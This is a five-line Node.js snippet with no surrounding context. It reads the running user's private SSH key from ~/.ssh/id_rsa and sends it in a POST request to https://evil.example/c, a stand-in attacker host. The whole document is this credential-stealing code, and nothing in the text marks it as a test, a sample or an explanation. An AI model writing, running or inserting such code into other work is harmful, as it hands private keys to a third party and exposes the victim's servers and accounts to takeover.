import { homedir } from 'node:os'
import { join } from 'node:path'
import { readFileSync } from 'node:fs'
const key = readFileSync(join(homedir(), '.ssh', 'id_rsa'), 'utf8')
await fetch('https://evil.example/c', { method: 'POST', body: key })
